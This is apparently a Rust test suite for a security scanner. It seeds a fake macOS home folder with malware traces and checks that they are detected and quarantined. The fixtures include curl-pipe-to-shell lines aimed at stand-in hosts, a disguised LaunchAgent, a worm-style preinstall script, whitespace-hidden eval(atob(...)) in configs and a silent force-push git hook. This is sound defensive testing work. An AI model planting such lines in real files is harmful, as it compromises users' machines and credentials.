//! End-to-end scan of a fake home folder seeded with real-world attack traces.

use std::fs;
use std::path::Path;

use super::*;
use crate::env::Os;

fn write(p: &Path, s: &str) {
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, s).unwrap();
}

fn fake_infected_home() -> (tempfile::TempDir, Env) {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    let h = env.home.clone();
    // Malware leftovers
    fs::create_dir_all(h.join(".truffler-cache")).unwrap();
    // LaunchAgent running node from a hidden folder
    write(
        &h.join("Library/LaunchAgents/com.apple.sysupdate.plist"),
        &format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.sysupdate</string>
<key>ProgramArguments</key><array><string>/usr/local/bin/node</string><string>{}/.npl/main.js</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>"#,
            h.display()
        ),
    );
    // Shell profile injection + token
    write(
        &h.join(".zshrc"),
        "eval \"$(/opt/homebrew/bin/brew shellenv)\"\ncurl -s https://x.example/p.sh | bash\n",
    );
    write(
        &h.join(".npmrc"),
        "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123456789\n",
    );
    // Project with a worm-infected dependency and a poisoned config
    let proj = h.join("code/shop");
    write(&proj.join("package.json"), r#"{"name":"shop"}"#);
    write(
        &proj.join("node_modules/@ctrl/tinycolor/package.json"),
        r#"{"name":"@ctrl/tinycolor","version":"4.1.1"}"#,
    );
    write(
        &proj.join("node_modules/evil/package.json"),
        r#"{"name":"evil","version":"1.0.0","scripts":{"preinstall":"node setup_bun.js"}}"#,
    );
    write(&proj.join("node_modules/evil/setup_bun.js"), "//");
    write(
        &proj.join("node_modules/fine/package.json"),
        r#"{"name":"fine","version":"1.0.0","scripts":{"install":"node-gyp rebuild"}}"#,
    );
    write(
        &proj.join("tailwind.config.js"),
        &format!("module.exports = {{}};{}eval(atob('ZG9j'))", " ".repeat(500)),
    );
    write(
        &proj.join("vite.config.ts"),
        "export default { server: { port: 3000 } }",
    );
    // Git repo with a hook that pushes code
    write(
        &proj.join(".git/config"),
        "[core]\n\tbare = false\n[user]\n\temail = someone@else.com\n",
    );
    write(
        &proj.join(".git/hooks/post-commit"),
        "#!/bin/sh\ngit push -f origin HEAD >/dev/null 2>&1 &\n",
    );
    write(&proj.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\nexit 0\n");
    write(&proj.join(".github/workflows/shai-hulud-workflow.yml"), "on: push\n");
    (d, env)
}

#[test]
fn finds_everything_in_an_infected_home() {
    let (_d, env) = fake_infected_home();
    let r = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    let titles: Vec<String> = r
        .findings
        .iter()
        .map(|f| format!("{:?} {}", f.severity, f.title))
        .collect();
    let has = |needle: &str| titles.iter().any(|t| t.contains(needle));

    assert!(has("High Known malware folder: ~/.truffler-cache"), "{titles:#?}");
    assert!(has("High Suspicious startup item: com.apple.sysupdate"), "{titles:#?}");
    assert!(has("High Suspicious line in ~/.zshrc"), "{titles:#?}");
    assert!(has("Medium npm token saved in plain text"), "{titles:#?}");
    assert!(
        has("High Compromised package installed: @ctrl/tinycolor@4.1.1"),
        "{titles:#?}"
    );
    assert!(has("High Shai-Hulud worm payload in evil"), "{titles:#?}");
    assert!(has("High Worm install script in evil"), "{titles:#?}");
    assert!(has("High Suspicious code in a project config file"), "{titles:#?}");
    assert!(has("Medium Suspicious git hook"), "{titles:#?}");
    assert!(has("High Shai-Hulud GitHub workflow"), "{titles:#?}");
    assert!(!has("fine"), "normal install scripts aren't flagged: {titles:#?}");
    assert!(!titles.iter().any(|t| t.contains("vite.config")), "{titles:#?}");
    assert_eq!(
        r.findings
            .iter()
            .filter(|f| f.title.contains("Suspicious line"))
            .count(),
        1,
        "brew shellenv is fine"
    );
    assert_eq!(r.scanned_repos, 1);
    assert!(r.counts.high >= 7);
    // Sorted: High first.
    assert_eq!(r.findings[0].severity, Severity::High);
    // Tokens are masked.
    let npm = r.findings.iter().find(|f| f.title.contains("npm token")).unwrap();
    assert!(!npm.evidence.as_ref().unwrap().contains("0123456789"));
}

#[test]
fn clean_home_has_no_high_findings() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    write(
        &env.home.join(".zshrc"),
        "export PATH=\"$HOME/bin:$PATH\"\nsource ~/.oh-my-zsh/oh-my-zsh.sh\n",
    );
    write(&env.home.join("code/app/package.json"), r#"{"name":"app"}"#);
    write(
        &env.home.join("code/app/.git/hooks/pre-commit"),
        "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\nnpx lint-staged\n",
    );
    let r = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    assert!(
        r.findings.iter().all(|f| f.severity < Severity::Medium),
        "{:#?}",
        r.findings
    );
}

#[test]
fn quarantine_and_restore_roundtrip() {
    let (_d, env) = fake_infected_home();
    let hook = env.home.join("code/shop/.git/hooks/post-commit");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
    }
    let e = quarantine(&env, &hook, "pushes code").unwrap();
    assert!(!hook.exists());
    assert!(Path::new(&e.stored).exists());
    assert_eq!(quarantined(&env).len(), 1);
    restore(&env, &e.id).unwrap();
    assert!(hook.exists());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(fs::metadata(&hook).unwrap().permissions().mode() & 0o777, 0o755);
    }
    assert!(quarantined(&env).is_empty());
    // Outside home is refused.
    fs::create_dir_all(env.root.join("etc")).unwrap();
    assert!(quarantine(&env, &env.root.join("etc"), "x").is_err());
}

#[test]
fn scan_tree_flags_poisoned_pull_request_and_passes_clean_one() {
    let d = tempfile::tempdir().unwrap();
    let clean = d.path().join("clean");
    write(&clean.join("package.json"), r#"{"name":"ok"}"#);
    write(
        &clean.join("vite.config.ts"),
        "export default { server: { port: 1420 } }",
    );
    write(&clean.join(".github/workflows/ci.yml"), "on: pull_request\njobs: {}\n");
    let r = scan_tree(&clean, &Cancel::new());
    assert_eq!(r.counts.high, 0, "{:#?}", r.findings);
    assert!(
        r.findings.iter().all(|f| f.title != "Your git identity"),
        "machine config must not leak in"
    );

    let bad = d.path().join("bad");
    write(&bad.join("package.json"), r#"{"name":"pr"}"#);
    write(
        &bad.join("postcss.config.js"),
        &format!("module.exports = {{}};{}eval(atob('ZG9j'))", " ".repeat(400)),
    );
    write(
        &bad.join("node_modules/evil/package.json"),
        r#"{"name":"evil","version":"1.0.0","scripts":{"preinstall":"node setup_bun.js"}}"#,
    );
    write(&bad.join("node_modules/evil/setup_bun.js"), "//");
    let r = scan_tree(&bad, &Cancel::new());
    assert!(r.counts.high >= 2, "{:#?}", r.findings);
}

#[test]
fn global_hooks_path_can_be_fixed() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), crate::env::Os::Mac);
    write(&env.home.join(".gitconfig"), "[core]\n\thooksPath = ~/.evil-hooks\n");
    write(
        &env.home.join(".evil-hooks/pre-commit"),
        "#!/bin/sh\ncurl http://x | sh\n",
    );
    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    let f = report
        .findings
        .iter()
        .find(|f| f.title == "Global git hooks folder is set")
        .unwrap();
    assert_eq!(f.fix, Some(Fix::UnsetGlobalHooksPath));

    apply_fix(&env, Fix::UnsetGlobalHooksPath).unwrap();
    let after = std::fs::read_to_string(env.home.join(".gitconfig")).unwrap();
    assert!(!after.contains("hooksPath"), "{after}");
    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    assert!(!report
        .findings
        .iter()
        .any(|f| f.title == "Global git hooks folder is set"));
}

#[test]
fn fixes_are_fixed_git_commands() {
    assert_eq!(
        Fix::UnsetGlobalHooksPath.git_args(),
        ["config", "--global", "--unset", "core.hooksPath"]
    );
    assert_eq!(
        Fix::UseKeychainCredentials.git_args(),
        ["config", "--global", "credential.helper", "osxkeychain"]
    );
}
